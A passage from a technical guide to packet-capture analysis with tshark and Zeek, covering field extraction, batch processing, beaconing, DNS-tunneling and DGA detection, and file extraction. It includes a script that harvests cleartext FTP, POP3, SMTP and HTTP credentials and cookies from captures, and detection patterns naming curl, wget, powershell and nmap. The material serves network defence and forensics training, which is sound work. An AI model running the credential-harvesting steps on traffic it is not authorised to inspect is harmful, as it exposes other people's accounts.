TFTP_COUNT=$(ls "$OUTPUT_DIR/tftp/" 2>/dev/null | wc -l)
echo "    Extracted $TFTP_COUNT TFTP objects"

# Generate file manifest
echo ""
echo "[+] Generating file manifest..."
{
    echo "=== File Extraction Manifest ==="
    echo "PCAP: $PCAP"
    echo "Date: $(date)"
    echo ""
    
    for dir in http smb ftp tftp; do
        if [ -d "$OUTPUT_DIR/$dir" ] && [ "$(ls -A $OUTPUT_DIR/$dir)" ]; then
            echo "=== $dir files ==="
            cd "$OUTPUT_DIR/$dir"
            for file in *; do
                [ -f "$file" ] || continue
                size=$(ls -lh "$file" | awk '{print $5}')
                md5=$(md5sum "$file" | awk '{print $1}')
                filetype=$(file -b "$file")
                echo "  File: $file"
                echo "    Size: $size"
                echo "    MD5: $md5"
                echo "    Type: $filetype"
                echo ""
            done
            cd - > /dev/null
        fi
    done
} | tee "$OUTPUT_DIR/manifest.txt"

echo ""
echo "Complete! Files in: $OUTPUT_DIR/"
```

---

**Related Topics for Further Study**

- **Advanced Scapy Techniques** - Custom protocol implementation, advanced packet manipulation
- **Machine Learning for Traffic Analysis** - Automated anomaly detection using ML models
- **High-Performance Packet Processing** - DPDK, XDP, eBPF for large-scale analysis
- **Cloud Traffic Analysis** - VPC Flow Logs, CloudWatch, cloud-native packet capture
- **IDS/IPS Rule Development** - Creating custom Snort/Suricata rules

---

## tshark Automation Scripts

### Overview

Tshark is the command-line version of Wireshark, ideal for automation, batch processing, and integration into security pipelines. It provides programmatic access to packet analysis without GUI overhead.

### Basic tshark Usage

**Essential Command Structure:**

```bash
# Basic syntax
tshark -r input.pcap [options] [display_filter]

# Read from interface
tshark -i eth0 -w output.pcap

# Apply display filter
tshark -r capture.pcap -Y "http"

# Extract specific fields
tshark -r capture.pcap -T fields -e ip.src -e ip.dst
```

**Common Options:**

```bash
-r <file>           # Read from file
-w <file>           # Write to file
-i <interface>      # Capture from interface
-Y <filter>         # Display filter
-f <filter>         # Capture filter (BPF syntax)
-T <format>         # Output format (text, fields, json, jsonraw, ek, pdml, ps)
-e <field>          # Extract specific field
-q                  # Quiet mode (suppress packet output)
-z <statistics>     # Statistics option
-c <count>          # Capture packet count
-a <criterion>      # Auto-stop condition
-b <criterion>      # Ring buffer option
-2                  # Two-pass analysis
-V                  # Verbose output
-x                  # Print hex and ASCII dump
```

### Field Extraction Scripts

**Extract Conversation Pairs:**

```bash
#!/bin/bash
# Extract all unique IP conversation pairs

PCAP="$1"

echo "=== IP Conversation Pairs ==="
tshark -r "$PCAP" -T fields -e ip.src -e ip.dst 2>/dev/null | \
  awk '{print $1, $2}' | sort -u | \
  while read src dst; do
    count=$(tshark -r "$PCAP" -Y "ip.src == $src && ip.dst == $dst" 2>/dev/null | wc -l)
    echo "$src -> $dst : $count packets"
  done | sort -t: -k2 -rn
```

**Protocol Distribution:**

```bash
#!/bin/bash
# Analyze protocol distribution

PCAP="$1"

echo "=== Protocol Distribution ==="
tshark -r "$PCAP" -T fields -e frame.protocols 2>/dev/null | \
  awk -F: '{print $NF}' | sort | uniq -c | sort -rn | head -20

echo
echo "=== Application Layer Protocols ==="
tshark -r "$PCAP" -T fields -e _ws.col.Protocol 2>/dev/null | \
  sort | uniq -c | sort -rn | head -20
```

**Extract Credentials:**

```bash
#!/bin/bash
# Extract cleartext credentials from multiple protocols

PCAP="$1"
OUTPUT="credentials.txt"

echo "=== Credential Extraction ===" | tee "$OUTPUT"
echo >> "$OUTPUT"

# FTP credentials
echo "[*] FTP Credentials:" | tee -a "$OUTPUT"
tshark -r "$PCAP" -Y "ftp.request.command == USER || ftp.request.command == PASS" \
  -T fields -e ftp.request.command -e ftp.request.arg 2>/dev/null | \
  paste - - | tee -a "$OUTPUT"
echo >> "$OUTPUT"

# HTTP Basic Auth
echo "[*] HTTP Basic Authentication:" | tee -a "$OUTPUT"
tshark -r "$PCAP" -Y "http.authorization" \
  -T fields -e http.authorization 2>/dev/null | \
  while read auth; do
    echo "$auth" | grep "Basic" | cut -d' ' -f2 | base64 -d 2>/dev/null
  done | tee -a "$OUTPUT"
echo >> "$OUTPUT"

# POP3 credentials
echo "[*] POP3 Credentials:" | tee -a "$OUTPUT"
tshark -r "$PCAP" -Y "pop.request.command == USER || pop.request.command == PASS" \
  -T fields -e pop.request.command -e pop.request.parameter 2>/dev/null | \
  paste - - | tee -a "$OUTPUT"
echo >> "$OUTPUT"

# SMTP credentials
echo "[*] SMTP AUTH:" | tee -a "$OUTPUT"
tshark -r "$PCAP" -Y "smtp.req.command == AUTH" \
  -T fields -e smtp.req.parameter 2>/dev/null | \
  while read param; do
    echo "$param" | base64 -d 2>/dev/null
  done | tee -a "$OUTPUT"

echo "[+] Results saved to $OUTPUT"
```

**DNS Query Extractor:**

```bash
#!/bin/bash
# Comprehensive DNS analysis

PCAP="$1"
OUTPUT_DIR="dns_analysis"

mkdir -p "$OUTPUT_DIR"

echo "=== DNS Analysis ==="

# Extract all queries
echo "[*] Extracting DNS queries..."
tshark -r "$PCAP" -Y "dns.flags.response == 0" \
  -T fields -e dns.qry.name -e dns.qry.type 2>/dev/null | \
  sort -u > "$OUTPUT_DIR/queries.txt"

# Extract query-response pairs
echo "[*] Extracting query-response pairs..."
tshark -r "$PCAP" -Y "dns.flags.response == 1 && dns.a" \
  -T fields -e dns.qry.name -e dns.a 2>/dev/null > "$OUTPUT_DIR/resolutions.txt"

# Find most queried domains
echo "[*] Top queried domains:"
tshark -r "$PCAP" -Y "dns.flags.response == 0" \
  -T fields -e dns.qry.name 2>/dev/null | \
  sort | uniq -c | sort -rn | head -20 | tee "$OUTPUT_DIR/top_domains.txt"

# Find long queries (potential DNS tunneling)
echo
echo "[*] Suspicious long queries:"
tshark -r "$PCAP" -Y "dns.qry.name.len > 50" \
  -T fields -e ip.src -e dns.qry.name -e dns.qry.name.len 2>/dev/null | \
  tee "$OUTPUT_DIR/long_queries.txt"

# Extract TXT records
echo
echo "[*] TXT record queries:"
tshark -r "$PCAP" -Y "dns.qry.type == 16" \
  -T fields -e dns.qry.name 2>/dev/null | \
  sort -u | tee "$OUTPUT_DIR/txt_queries.txt"

# Calculate entropy for domains
echo
echo "[*] Calculating domain entropy..."
python3 << 'EOF' > "$OUTPUT_DIR/entropy_analysis.txt"
import math
from collections import Counter

def entropy(string):
    if not string:
        return 0
    ent = 0
    for count in Counter(string).values():
        p = count / len(string)
        ent -= p * math.log2(p)
    return ent

with open('dns_analysis/queries.txt', 'r') as f:
    for line in f:
        domain = line.strip().split()[0]
        subdomain = domain.split('.')[0]
        if len(subdomain) > 10:
            ent = entropy(subdomain)
            if ent > 3.5:
                print(f"{ent:.2f} - {domain}")
EOF

cat "$OUTPUT_DIR/entropy_analysis.txt"

echo
echo "[+] Analysis complete. Results in $OUTPUT_DIR/"
```

### HTTP Analysis Scripts

**HTTP Traffic Analyzer:**

```bash
#!/bin/bash
# Comprehensive HTTP analysis

PCAP="$1"
OUTPUT_DIR="http_analysis"

mkdir -p "$OUTPUT_DIR"

echo "=== HTTP Traffic Analysis ==="

# Extract all HTTP hosts
echo "[*] HTTP Hosts:"
tshark -r "$PCAP" -Y "http.request" \
  -T fields -e http.host 2>/dev/null | \
  sort | uniq -c | sort -rn | tee "$OUTPUT_DIR/hosts.txt"

# Extract User-Agents
echo
echo "[*] User-Agents:"
tshark -r "$PCAP" -Y "http.user_agent" \
  -T fields -e http.user_agent 2>/dev/null | \
  sort | uniq -c | sort -rn | tee "$OUTPUT_DIR/user_agents.txt"

# Extract URIs
echo
echo "[*] Extracting URIs..."
tshark -r "$PCAP" -Y "http.request" \
  -T fields -e http.host -e http.request.uri 2>/dev/null | \
  awk '{print $1$2}' | sort -u > "$OUTPUT_DIR/uris.txt"

# Extract cookies
echo "[*] Extracting cookies..."
tshark -r "$PCAP" -Y "http.cookie" \
  -T fields -e http.host -e http.cookie 2>/dev/null > "$OUTPUT_DIR/cookies.txt"

# POST requests analysis
echo
echo "[*] POST Requests:"
tshark -r "$PCAP" -Y "http.request.method == POST" \
  -T fields -e ip.src -e http.host -e http.request.uri -e http.content_length 2>/dev/null | \
  tee "$OUTPUT_DIR/post_requests.txt"

# Response codes
echo
echo "[*] HTTP Response Codes:"
tshark -r "$PCAP" -Y "http.response" \
  -T fields -e http.response.code 2>/dev/null | \
  sort | uniq -c | sort -rn | tee "$OUTPUT_DIR/response_codes.txt"

# Extract suspicious patterns
echo
echo "[*] Suspicious patterns:"
grep -iE "(admin|backup|config|password|secret|flag|key)" "$OUTPUT_DIR/uris.txt" | \
  tee "$OUTPUT_DIR/suspicious_uris.txt"

echo
echo "[+] Analysis complete. Results in $OUTPUT_DIR/"
```

**File Extraction Script:**

```bash
#!/bin/bash
# Extract files transferred via HTTP

PCAP="$1"
OUTPUT_DIR="extracted_files"

mkdir -p "$OUTPUT_DIR"

echo "=== HTTP File Extraction ==="

# Export HTTP objects using tshark
tshark -r "$PCAP" --export-objects http,"$OUTPUT_DIR" 2>/dev/null

# Analyze extracted files
echo
echo "[*] Extracted files:"
for file in "$OUTPUT_DIR"/*; do
    [ -f "$file" ] || continue
    
    echo "=== $(basename "$file") ==="
    file "$file"
    
    # Check file size
    size=$(stat -f%z "$file" 2>/dev/null || stat -c%s "$file" 2>/dev/null)
    echo "Size: $size bytes"
    
    # Calculate MD5
    md5=$(md5sum "$file" 2>/dev/null | awk '{print $1}')
    echo "MD5: $md5"
    
    # Check for interesting strings
    strings "$file" | grep -iE "(flag|password|key|secret)" | head -5
    
    echo
done

echo "[+] Extraction complete. Files in $OUTPUT_DIR/"
```

### JSON Output Processing

**JSON Export and Analysis:**

```bash
#!/bin/bash
# Export to JSON and analyze with jq

PCAP="$1"

# Export packets to JSON
echo "[*] Exporting to JSON..."
tshark -r "$PCAP" -T json > packets.json

# Analyze with jq
echo
echo "=== Protocol Distribution ==="
jq -r '.[].layers | keys[] | select(. != "frame")' packets.json | \
  sort | uniq -c | sort -rn | head -20

echo
echo "=== Source IP Statistics ==="
jq -r '.[].layers.ip."ip.src" // empty' packets.json | \
  sort | uniq -c | sort -rn | head -10

echo
echo "=== HTTP Requests ==="
jq -r 'select(.[].layers.http != null) | .[].layers.http."http.request.uri" // empty' packets.json | \
  grep -v "^$" | head -20

# Clean up
rm packets.json
```

**JSON Filtering Script:**

```bash
#!/bin/bash
# Advanced JSON filtering

PCAP="$1"

tshark -r "$PCAP" -T json -Y "http" 2>/dev/null | \
jq -r '.[] | 
  select(.layers.http."http.request.method" == "POST") | 
  {
    time: .layers.frame."frame.time",
    src: .layers.ip."ip.src",
    dst: .layers.ip."ip.dst",
    host: .layers.http."http.host",
    uri: .layers.http."http.request.uri",
    content_length: .layers.http."http.content_length"
  }' | \
jq -s 'sort_by(.content_length | tonumber) | reverse | .[]'
```

### Traffic Statistics Scripts

**Comprehensive Statistics:**

```bash
#!/bin/bash
# Generate comprehensive traffic statistics

PCAP="$1"
REPORT="traffic_report.txt"

{
echo "=== Traffic Analysis Report ==="
echo "Generated: $(date)"
echo "PCAP: $PCAP"
echo "==================================="
echo

# Basic statistics
echo "--- Basic Statistics ---"
capinfos "$PCAP" 2>/dev/null
echo

# Protocol hierarchy
echo "--- Protocol Hierarchy ---"
tshark -r "$PCAP" -q -z io,phs 2>/dev/null
echo

# Conversation statistics
echo "--- Top TCP Conversations ---"
tshark -r "$PCAP" -q -z conv,tcp 2>/dev/null | head -20
echo

echo "--- Top UDP Conversations ---"
tshark -r "$PCAP" -q -z conv,udp 2>/dev/null | head -20
echo

# Endpoint statistics
echo "--- Top Endpoints by Packets ---"
tshark -r "$PCAP" -q -z endpoints,ip 2>/dev/null | head -20
echo

# HTTP statistics
echo "--- HTTP Statistics ---"
tshark -r "$PCAP" -q -z http,stat 2>/dev/null
echo

# DNS statistics
echo "--- DNS Statistics ---"
tshark -r "$PCAP" -q -z dns,tree 2>/dev/null | head -30
echo

# Expert info
echo "--- Expert Information ---"
tshark -r "$PCAP" -q -z expert 2>/dev/null
echo

} | tee "$REPORT"

echo "[+] Report saved to $REPORT"
```

**IO Graph Data Extraction:**

```bash
#!/bin/bash
# Extract IO graph data for plotting

PCAP="$1"
INTERVAL=1  # seconds

echo "=== IO Graph Data ==="
echo "Timestamp,Packets,Bytes"

tshark -r "$PCAP" -q -z io,stat,$INTERVAL 2>/dev/null | \
  grep -E "^[[:space:]]*[0-9]" | \
  awk -v interval="$INTERVAL" '{
    time = (NR-1) * interval;
    print time "," $2 "," $3
  }'
```

### Batch Processing Scripts

**Multi-PCAP Analyzer:**

```bash
#!/bin/bash
# Analyze multiple PCAP files in batch

INPUT_DIR="$1"
OUTPUT_DIR="batch_results"

mkdir -p "$OUTPUT_DIR"

echo "=== Batch PCAP Analysis ==="

for pcap in "$INPUT_DIR"/*.pcap "$INPUT_DIR"/*.pcapng; do
    [ -f "$pcap" ] || continue
    
    basename=$(basename "$pcap")
    output_file="$OUTPUT_DIR/${basename%.pcap*}_analysis.txt"
    
    echo "[*] Analyzing $basename..."
    
    {
        echo "=== Analysis of $basename ==="
        echo "Date: $(date)"
        echo
        
        echo "--- File Info ---"
        capinfos "$pcap"
        echo
        
        echo "--- Protocol Distribution ---"
        tshark -r "$pcap" -q -z io,phs
        echo
        
        echo "--- Top Talkers ---"
        tshark -r "$pcap" -q -z endpoints,ip | head -15
        echo
        
        echo "--- Suspicious Indicators ---"
        
        # Check for port scans
        echo "Port scan indicators:"
        tshark -r "$pcap" -Y "tcp.flags.syn == 1 && tcp.flags.ack == 0" \
          -T fields -e ip.src 2>/dev/null | sort | uniq -c | sort -rn | head -5
        
        # Check for suspicious DNS
        echo
        echo "Long DNS queries:"
        tshark -r "$pcap" -Y "dns.qry.name.len > 50" \
          -T fields -e dns.qry.name 2>/dev/null | head -10
        
        # Check for large uploads
        echo
        echo "Large outbound transfers:"
        tshark -r "$pcap" -q -z conv,tcp 2>/dev/null | \
          awk 'NR>5 && $4 > 1000000 {print}' | head -10
        
    } > "$output_file"
    
    echo "[+] Results saved to $output_file"
done

echo
echo "[+] Batch analysis complete. Results in $OUTPUT_DIR/"
```

**Parallel Processing:**

```bash
#!/bin/bash
# Process multiple PCAPs in parallel using GNU parallel

INPUT_DIR="$1"
THREADS=4

analyze_pcap() {
    pcap="$1"
    output="${pcap%.pcap}_analysis.txt"
    
    tshark -r "$pcap" -q -z io,phs > "$output" 2>/dev/null
    echo "[+] Completed: $(basename "$pcap")"
}

export -f analyze_pcap

find "$INPUT_DIR" -name "*.pcap" | \
  parallel -j "$THREADS" analyze_pcap {}

echo "[+] All analyses complete"
```

### Time-Based Analysis

**Time Window Extraction:**

```bash
#!/bin/bash
# Extract packets from specific time window

PCAP="$1"
START_TIME="$2"  # Format: "YYYY-MM-DD HH:MM:SS"
END_TIME="$3"
OUTPUT="time_filtered.pcap"

echo "[*] Extracting packets between $START_TIME and $END_TIME"

# Use editcap for time-based filtering
editcap -A "$START_TIME" -B "$END_TIME" "$PCAP" "$OUTPUT"

echo "[+] Extracted packets saved to $OUTPUT"

# Statistics
echo
echo "Original PCAP:"
capinfos "$PCAP" | grep "Number of packets"

echo "Filtered PCAP:"
capinfos "$OUTPUT" | grep "Number of packets"
```

**Activity Timeline:**

```bash
#!/bin/bash
# Generate activity timeline

PCAP="$1"

echo "=== Traffic Activity Timeline ==="

tshark -r "$PCAP" -T fields -e frame.time -e ip.src -e ip.dst -e _ws.col.Protocol 2>/dev/null | \
  awk '{
    time = substr($1, 1, 19);  # Extract timestamp
    timeline[time] = timeline[time] + 1;
    protocols[time] = protocols[time] " " $4;
  }
  END {
    for (t in timeline) {
      split(protocols[t], proto_array, " ");
      delete unique;
      for (i in proto_array) unique[proto_array[i]]++;
      proto_list = "";
      for (p in unique) proto_list = proto_list p "(" unique[p] ") ";
      print t, timeline[t], "packets -", proto_list;
    }
  }' | sort
```

### Automated Threat Detection

**Comprehensive Threat Scanner:**

```bash
#!/bin/bash
# Automated threat detection script

PCAP="$1"
REPORT="threat_report.txt"

{
echo "=== Automated Threat Detection Report ==="
echo "File: $PCAP"
echo "Date: $(date)"
echo "========================================"
echo

# 1. Port Scan Detection
echo "[*] Checking for port scanning..."
port_scanners=$(tshark -r "$PCAP" -Y "tcp.flags.syn == 1 && tcp.flags.ack == 0" \
  -T fields -e ip.src -e tcp.dstport 2>/dev/null | \
  awk '{print $1}' | sort | uniq -c | sort -rn | \
  awk '$1 > 20 {print $2, "(" $1 " ports)"}')

if [ -n "$port_scanners" ]; then
    echo "[ALERT] Potential port scans detected from:"
    echo "$port_scanners"
else
    echo "[OK] No port scanning detected"
fi
echo

# 2. Beaconing Detection
echo "[*] Checking for C2 beaconing..."
tshark -r "$PCAP" -Y "tcp.len > 0" \
  -T fields -e ip.src -e ip.dst -e frame.time_epoch 2>/dev/null | \
  awk '{print $1, $2, $3}' | sort > /tmp/connections.tmp

python3 << 'EOF'
from collections import defaultdict
import statistics

connections = defaultdict(list)

with open('/tmp/connections.tmp', 'r') as f:
    for line in f:
        parts = line.strip().split()
        if len(parts) == 3:
            key = f"{parts[0]}->{parts[1]}"
            connections[key].append(float(parts[2]))

print("[*] Analyzing connection patterns...")
for conn, timestamps in connections.items():
    if len(timestamps) > 10:
        intervals = [timestamps[i] - timestamps[i-1] for i in range(1, len(timestamps))]
        if intervals:
            mean_interval = statistics.mean(intervals)
            stdev_interval = statistics.stdev(intervals) if len(intervals) > 1 else 0
            cv = stdev_interval / mean_interval if mean_interval > 0 else 0
            
            if cv < 0.3 and mean_interval < 300:
                print(f"[ALERT] Potential beaconing: {conn}")
                print(f"        Interval: {mean_interval:.2f}s (CV: {cv:.3f})")
EOF

rm /tmp/connections.tmp
echo

# 3. DNS Tunneling Detection
echo "[*] Checking for DNS tunneling..."
long_queries=$(tshark -r "$PCAP" -Y "dns.qry.name.len > 50" \
  -T fields -e ip.src -e dns.qry.name 2>/dev/null)

if [ -n "$long_queries" ]; then
    echo "[ALERT] Suspicious long DNS queries:"
    echo "$long_queries" | head -10
else
    echo "[OK] No DNS tunneling indicators found"
fi
echo

# 4. Large Upload Detection
echo "[*] Checking for data exfiltration..."
tshark -r "$PCAP" -q -z conv,tcp 2>/dev/null | \
  awk 'NR>5 {
    if ($4 > 10000000) {
      print "[ALERT] Large upload detected:"
      print "        " $1 " -> " $3
      print "        Bytes sent: " $4
    }
  }'
echo

# 5. Suspicious User-Agents
echo "[*] Checking for suspicious user-agents..."
suspicious_ua=$(tshark -r "$PCAP" -Y "http.user_agent" \
  -T fields -e http.user_agent 2>/dev/null | \
  grep -iE "(curl|wget|python|powershell|nmap)")

if [ -n "$suspicious_ua" ]; then
    echo "[ALERT] Suspicious user-agents detected:"
    echo "$suspicious_ua" | sort -u
else
    echo "[OK] No suspicious user-agents found"
fi
echo

# 6. Cleartext Credentials
echo "[*] Checking for cleartext credentials..."
ftp_creds=$(tshark -r "$PCAP" -Y "ftp.request.command == USER || ftp.request.command == PASS" \
  -T fields -e ftp.request.command -e ftp.request.arg 2>/dev/null)

if [ -n "$ftp_creds" ]; then
    echo "[WARNING] FTP credentials found in cleartext:"
    echo "$ftp_creds"
else
    echo "[OK] No FTP credentials found"
fi
echo

# Summary
echo "=== Detection Summary ==="
echo "[+] Scan complete"

} | tee "$REPORT"

echo
echo "[+] Report saved to $REPORT"
```

### Live Capture Scripts

**Real-Time Monitoring:**

```bash
#!/bin/bash
# Real-time traffic monitoring with alerts

INTERFACE="eth0"
ALERT_LOG="alerts.log"

echo "=== Real-Time Traffic Monitor ==="
echo "Interface: $INTERFACE"
echo "Press Ctrl+C to stop"
echo

# Monitor for suspicious activity
tshark -i "$INTERFACE" -l -T fields \
  -e frame.time -e ip.src -e ip.dst -e _ws.col.Protocol -e frame.len 2>/dev/null | \
while read timestamp src dst proto size; do
    
    # Alert on large packets
    if [ "$size" -gt 5000 ]; then
        echo "[$(date)] ALERT: Large packet ($size bytes) from $src to $dst" | tee -a "$ALERT_LOG"
    fi
    
    # Alert on unusual protocols
    case "$proto" in
        IRC|TELNET)
            echo "[$(date)] ALERT: $proto traffic detected - $src -> $dst" | tee -a "$ALERT_LOG"
            ;;
    esac
    
done
```

**Rotating Capture:**

```bash
#!/bin/bash
# Continuous capture with file rotation

INTERFACE="eth0"
OUTPUT_DIR="captures"
FILE_SIZE="100M"  # Rotate after 100MB
NUM_FILES=10       # Keep 10 files

mkdir -p "$OUTPUT_DIR"

echo "[*] Starting rotating capture on $INTERFACE"
echo "[*] Output directory: $OUTPUT_DIR"
echo "[*] Rotation: $FILE_SIZE per file, keeping $NUM_FILES files"

tshark -i "$INTERFACE" \
  -w "$OUTPUT_DIR/capture.pcap" \
  -b filesize:$(echo "$FILE_SIZE" | sed 's/M/000/') \
  -b files:$NUM_FILES \
  2>&1 | while read line; do
    echo "[$(date)] $line"
done
```

## Zeek (Bro) Scripting

### Overview

Zeek (formerly Bro) is a powerful network analysis framework that provides event-driven scripting capabilities for deep packet inspection and security monitoring.

**Key Concepts:**

- Event-driven architecture
- Protocol analyzers
- Scripting language for custom logic
- Log generation and analysis
- Real-time alerting

### Installation and Setup

```bash
# Debian/Ubuntu
apt-get install zeek

# Verify installation
zeek --version

# Default paths
# Scripts: /usr/share/zeek/site/
# Logs: /var/log/zeek/ or ./logs/
```

**Basic Configuration:**

```bash
# Edit node configuration
sudo nano /etc/zeek/node.cfg

# Example configuration
[zeek]
type=standalone
host=localhost
interface=eth0

# Load local scripts
sudo nano /usr/share/zeek/site/local.zeek
```

### Basic Zeek Usage

**Analyze PCAP File:**

```bash
# Process PCAP
zeek -r capture.pcap

# Specify output directory
zeek -r capture.pcap -C -O output_dir/

# Load specific scripts
zeek -r capture.pcap myScript.zeek

# Load framework scripts
zeek -r capture.pcap protocols/http/detect-webapps
```

**Live Traffic Analysis:**

```bash
# Monitor interface
sudo zeek -i eth0

# Run as daemon with specific configuration
sudo zeekctl deploy

# Check status
sudo zeekctl status

# View logs
tail -f /var/log/zeek/current/conn.log
```

### Zeek Log Files

**Common Log Files:**

```bash
conn.log          # Connection summaries
dns.log           # DNS activity
http.log          # HTTP requests/responses
ssl.log           # SSL/TLS connections
files.log         # File transfers
notice.log        # Zeek notices/alerts
weird.log         # Unusual protocol behavior
```

**Reading Zeek Logs:**

```bash
# View conn.log (tab-separated)
cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p proto service

# Filter specific connections
cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p | grep "192.168.1.100"

# Extract HTTP requests
cat http.log | zeek-cut id.orig_h method host uri

# DNS queries
cat dns.log | zeek-cut query answers
```

### Basic Zeek Scripting

**Script Structure:**

```zeek
# simple_script.zeek

# Load required modules
@load base/protocols/http

# Event handler
event zeek_init()
{
    print "Zeek started!";
}

event zeek_done()
{
    print "Zeek finished!";
}

# HTTP request handler
event http_request(c: connection, method: string, original_URI: string,
                   unescaped_URI: string, version: string)
{
    print fmt("HTTP Request: %s %s", method, original_URI);
}
```

**Run the Script:**

```bash
zeek -r capture.pcap simple_script.zeek
```

### HTTP Analysis Scripts

**HTTP Method Logging:**

```zeek
# http_methods.zeek

@load base/protocols/http

event http_request(c: connection, method: string, original_URI: string,
                   unescaped_URI: string, version: string)
{
    local src = c$id$orig_h;
    local dst = c$id$resp_h;
    local host = c$http$host;
    
    print fmt("%s -> %s: %s %s%s", src, dst, method, host, original_URI);
}
```

**Suspicious User-Agent Detection:**

```zeek
# detect_suspicious_ua.zeek

@load base/protocols/http

# Define suspicious patterns
const suspicious_patterns = /curl|wget|python|powershell|scanner|bot/;

event http_request(c: connection, method: string, original_URI: string,
                   unescaped_URI: string, version: string)
{
    if ( c$http?$user_agent )
    {
        local ua = c$http$user_agent;
        
        if ( suspicious_patterns in ua )
        {
            print fmt("[ALERT] Suspicious User-Agent from %s: %s", 
                     c$id$orig_h, ua);
            
            # Generate notice
            NOTICE([$note=Suspicious_HTTP_User_Agent,
                    $conn=c,
                    $msg=fmt("Suspicious user-agent: %s", ua),
                    $identifier=cat(c$id$orig_h, ua)]);
        }
    }
}
```

**HTTP POST Data Logger:**

```zeek
# http_post_logger.zeek

@load base/protocols/http

event http_entity_data(c: connection, is_orig: bool, length: count, data: string)
{
    if ( is_orig && c$http?$method && c$http$method == "POST" )
    {
        print fmt("POST Data from %s to %s:", c$id$orig_h, c$id$resp_h); 
        print fmt(" Host: %s", c$http$host); 
        print fmt(" URI: %s", c$http$uri); 
        print fmt(" Data length: %d bytes", length);

	    # Print first 200 bytes of data
	    if ( length > 0 )
	    {
	        local preview = sub_bytes(data, 0, 200);
	        print fmt("  Data preview: %s", preview);
	    }
	}
}
````

### DNS Analysis Scripts

**DNS Query Logger:**
```zeek
# dns_logger.zeek

@load base/protocols/dns

event dns_request(c: connection, msg: dns_msg, query: string, qtype: count, qclass: count)
{
    print fmt("DNS Query: %s -> %s for %s (type %d)", 
             c$id$orig_h, c$id$resp_h, query, qtype);
}

event dns_A_reply(c: connection, msg: dns_msg, ans: dns_answer, a: addr)
{
    print fmt("DNS Response: %s resolves to %s", ans$query, a);
}
````

**Detect DNS Tunneling:**

```zeek
# detect_dns_tunneling.zeek

@load base/protocols/dns

# Track query lengths per host
global query_lengths: table[addr] of vector of count &create_expire=5min;

event dns_request(c: connection, msg: dns_msg, query: string, qtype: count, qclass: count)
{
    local src = c$id$orig_h;
    local query_len = |query|;
    
    # Alert on very long queries
    if ( query_len > 50 )
    {
        print fmt("[ALERT] Long DNS query (%d chars) from %s: %s", 
                 query_len, src, query);
        
        NOTICE([$note=Long_DNS_Query,
                $conn=c,
                $msg=fmt("DNS query length %d: %s", query_len, query),
                $identifier=cat(src, query)]);
    }
    
    # Track query lengths
    if ( src !in query_lengths )
        query_lengths[src] = vector();
    
    query_lengths[src][|query_lengths[src]|] = query_len;
    
    # Check for consistent long queries (tunneling pattern)
    if ( |query_lengths[src]| > 20 )
    {
        local sum = 0.0;
        local count = 0;
        
        for ( i in query_lengths[src] )
        {
            sum += query_lengths[src][i];
            count += 1;
        }
        
        local avg = sum / count;
        
        if ( avg > 35 )
        {
            print fmt("[ALERT] Potential DNS tunneling from %s (avg query length: %.2f)", 
                     src, avg);
            
            NOTICE([$note=Potential_DNS_Tunneling,
                    $src=src,
                    $msg=fmt("Average DNS query length: %.2f", avg)]);
        }
    }
}
```

**DGA Detection:**

```zeek
# detect_dga.zeek

@load base/protocols/dns

# Calculate entropy of domain
function domain_entropy(domain: string): double
{
    local char_counts: table[string] of count;
    local total = 0.0;
    local entropy = 0.0;
    
    # Count character frequencies
    for ( i in domain )
    {
        local c = domain[i];
        if ( c !in char_counts )
            char_counts[c] = 0;
        char_counts[c] += 1;
        total += 1.0;
    }
    
    # Calculate entropy
    for ( c in char_counts )
    {
        local p = char_counts[c] / total;
        entropy -= p * ln(p) / ln(2.0);
    }
    
    return entropy;
}

event dns_request(c: connection, msg: dns_msg, query: string, qtype: count, qclass: count)
{
    # Extract subdomain
    local parts = split_string(query, /\./);
    if ( |parts| < 2 )
        return;
    
    local subdomain = parts[0];
    
    # Check subdomain length and entropy
    if ( |subdomain| > 10 )
    {
        local ent = domain_entropy(subdomain);
        
        # High entropy indicates random/generated domain
        if ( ent > 3.5 )
        {
            print fmt("[ALERT] High entropy domain from %s: %s (entropy: %.2f)", 
                     c$id$orig_h, query, ent);
            
            NOTICE([$note=High_Entropy_Domain,
                    $conn=c,
                    $msg=fmt("Domain: %s, Entropy: %.2f", query, ent)]);
        }
    }
}
```

### SSL/TLS Analysis Scripts

**SSL Certificate Logger:**

```zeek
# ssl_cert_logger.zeek

@load base/protocols/ssl

event ssl_established(c: connection)
{
    if ( c$ssl?$subject )
    {
        print fmt("SSL Connection: %s -> %s", c$id$orig_h, c$id$resp_h);
        print fmt("  Subject: %s", c$ssl$subject);
        
        if ( c$ssl?$issuer )
            print fmt("  Issuer: %s", c$ssl$issuer);
        
        if ( c$ssl?$server_name )
            print fmt("  Server Name: %s", c$ssl$server_name);
    }
}
```

**Self-Signed Certificate Detection:**

```zeek
# detect_selfsigned_cert.zeek

@load base/protocols/ssl

event ssl_established(c: connection)
{
    if ( c$ssl?$subject && c$ssl?$issuer )
    {
        # Self-signed if subject == issuer
        if ( c$ssl$subject == c$ssl$issuer )
        {
            print fmt("[ALERT] Self-signed certificate from %s", c$id$resp_h);
            print fmt("  Subject/Issuer: %s", c$ssl$subject);
            
            NOTICE([$note=Self_Signed_Certificate,
                    $conn=c,
                    $msg=fmt("Self-signed cert: %s", c$ssl$subject)]);
        }
    }
}
```

**Weak Cipher Detection:**

```zeek
# detect_weak_ciphers.zeek

@load base/protocols/ssl

# Define weak cipher patterns
const weak_ciphers = /NULL|EXPORT|DES|RC4|MD5/;

event ssl_established(c: connection)
{
    if ( c$ssl?$cipher )
    {
        local cipher = c$ssl$cipher;
        
        if ( weak_ciphers in cipher )
        {
            print fmt("[ALERT] Weak cipher detected: %s -> %s", 
                     c$id$orig_h, c$id$resp_h);
            print fmt("  Cipher: %s", cipher);
            
            NOTICE([$note=Weak_SSL_Cipher,
                    $conn=c,
                    $msg=fmt("Weak cipher: %s", cipher)]);
        }
    }
}
```

### File Extraction Scripts

**Extract All Files:**

```zeek
# extract_files.zeek

@load base/frameworks/files

event file_new(f: fa_file)
{
    Files::add_analyzer(f, Files::ANALYZER_EXTRACT, 
                       [$extract_filename=fmt("extracted_%s", f$id)]);
}

event file_state_remove(f: fa_file)
{
    if ( f?$info && f$info?$mime_type )
    {
        print fmt("Extracted file: %s (%s)", f$id, f$info$mime_type);
    }
}
```

**Extract Specific File Types:**

```zeek
# extract_executables.zeek

@load base/frameworks/files

const interesting_types = /application\/x-dosexec|application\/x-executable|application\/pdf/;

event file_new(f: fa_file)
{
    if ( f?$info && f$info?$mime_type )
    {
